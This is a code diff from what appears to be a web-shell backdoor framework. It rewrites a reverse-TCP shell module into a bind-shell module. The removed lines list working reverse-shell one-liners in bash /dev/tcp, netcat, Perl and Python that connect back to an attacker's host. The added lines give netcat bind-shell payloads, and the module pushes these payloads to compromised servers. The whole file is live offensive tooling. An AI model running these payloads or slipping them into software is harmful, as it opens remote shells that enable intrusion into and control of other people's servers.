@@ -12,21 +12,19 @@ Created on 22/ago/2011
 
 from core.module import Module, ModuleException
 from core.vector import VectorList, Vector
-from threading import Timer, Lock
+from threading import Timer
 
-classname = 'Reversetcp'
+classname = 'Tcp'
     
-class Reversetcp(Module):
-    """Send reverse TCP shell  
-    :backdoor.reverse_tcp <ip> <port>
+class Tcp(Module):
+    """Spawn shell on TCP port 
+    :backdoor.tcp <port>
     """
     
     vectors = VectorList([
-            Vector('shell.sh', 'devtcp', "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"),
-            Vector('shell.sh', 'netcat-traditional', """nc -e /bin/sh %s %s"""),
-            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f"""),
-            Vector('shell.sh', 'perl', """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""),
-            Vector('shell.sh', 'python', """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""),
+            Vector('shell.sh', 'netcat-traditional', """nc -l -p %s -e /bin/sh"""),
+            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l %s >/tmp/f""")
+            
             ])
 
     def __init__( self, modhandler , url, password):
@@ -37,7 +35,7 @@ class Reversetcp(Module):
         Module.__init__(self, modhandler, url, password)
         
                 
-    def run(self, host, port):
+    def run(self, port):
 
         t = Timer(5.0, self.__check_module_state)
         t.start()
@@ -47,24 +45,22 @@ class Reversetcp(Module):
             self.last_vector = vector.name
 
             
-            self.__execute_payload(vector, [host, port])
+            self.__execute_payload(vector, [port])
             
         vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         for vector in vectors:
             
             self.last_vector = vector.name
-            self.__execute_payload(vector, [host, port])
+            self.__execute_payload(vector, [port])
 
         if t.isAlive():
             t.cancel()
             
         if not self.done:
             self.last_vector = None
-            self.mprint("[%s] No reverse backdoor method worked. Assure remote port is" % (self.name))
-            self.mprint("[%s] listening using commands like \'nc -v -l -p <port>\'" % (self.name))
+            self.mprint("[%s] No backdoor method worked. Assure port is not busy." % (self.name))
 
                 
-
     def __execute_payload(self, vector, parameters):
         
         payload = self.__prepare_payload(vector, parameters)
@@ -81,7 +77,7 @@ class Reversetcp(Module):
     
     def __check_module_state(self):
         if self.last_vector and not self.done:
-            self.mprint('[%s] Reverse backdoor \'%s\' seems connected, waiting for commands' % (self.name, self.last_vector))
+            self.mprint('[%s] Backdoor \'%s\' seems spawned. End commands with ";" if needed' % (self.name, self.last_vector))
             self.done = True
            
-        
+    
